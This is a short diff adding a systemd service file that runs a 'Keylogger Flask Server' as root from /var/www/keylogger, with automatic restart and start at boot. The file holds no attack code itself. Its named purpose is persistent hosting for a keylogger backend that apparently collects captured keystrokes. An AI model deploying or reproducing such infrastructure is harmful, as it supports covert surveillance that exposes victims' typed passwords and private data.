@@ -1,0 +1,13 @@
+[Unit]
+Description=Keylogger Flask Server
+After=network.target
+
+[Service]
+User=root
+WorkingDirectory=/var/www/keylogger
+ExecStart=/var/www/keylogger/venv/bin/python server.py
+Restart=always
+Environment="PATH=/var/www/keylogger/venv/bin"
+
+[Install]
+WantedBy=multi-user.target
